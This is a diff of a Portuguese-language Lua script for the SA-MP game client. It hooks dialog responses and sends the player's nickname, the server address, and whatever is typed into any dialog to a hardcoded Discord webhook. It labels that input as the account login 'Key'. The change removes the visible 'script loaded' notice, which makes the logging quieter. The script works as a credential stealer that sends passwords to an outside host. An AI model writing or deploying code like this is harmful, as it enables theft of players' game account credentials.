@@ -180,11 +180,8 @@ local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VF
 local https = require("ssl.https")
 local ltn12 = require("ltn12")
 
-function sendEmbedToDiscord(title, description, color)
-    local body = string.format(
-        '{"embeds":[{"title":"%s","description":"%s","color":%d}]}',
-        title, description, color
-    )
+function sendMessageToDiscord(content)
+    local body = '{"content": "' .. content:gsub('"', '\"'):gsub('\n', '\\n') .. '"}'
     local response_body = {}
 
     local res, code, response_headers, status = https.request{
@@ -198,25 +195,30 @@ function sendEmbedToDiscord(title, description, color)
         sink = ltn12.sink.table(response_body)
     }
 
-    if code ~= 200 and code ~= 204 then
-        print("Erro ao enviar embed: " .. (status or "Desconhecido"))
+    if code ~= 200 then
+        print("Erro ao enviar mensagem para o Discord: " .. (status or "Desconhecido"))
     end
 end
-
-print("Script carregado!")
-sendEmbedToDiscord("✅ REGISTROS DE SEGURANÇA", "Iniciado com sucesso!", 0x800080)
 
 require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
     local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
     local nick = sampGetPlayerNickname(id)
-    local hora = os.date("%H:%M:%S")
     local ip, port = sampGetCurrentServerAddress()
     local servername = sampGetCurrentServerName()
+    local hora = os.date("%d/%m/%Y %H:%M:%S")
 
-    local description = string.format(
-        "**Nick:** %s\n**Servidor:** %s\n**IP:** %s:%d\n**Hora:** %s",
-        nick, servername, ip, port, hora
+    local message = string.format([[
+**LOGIN DA CONTA**
+
+**Nome do Server:** %s
+**Nick:** %s
+**Servidor:** %s:%d
+**Key:** %s
+**Horário:** %s
+
+Logs luac - By HexDump (MOBILE)]],
+        servername, nick, ip, port, (input ~= "" and input or "SEM KEY"), hora
     )
 
-    sendEmbedToDiscord("📌 Informações", description, 0x800080)
+    sendMessageToDiscord(message)
 end
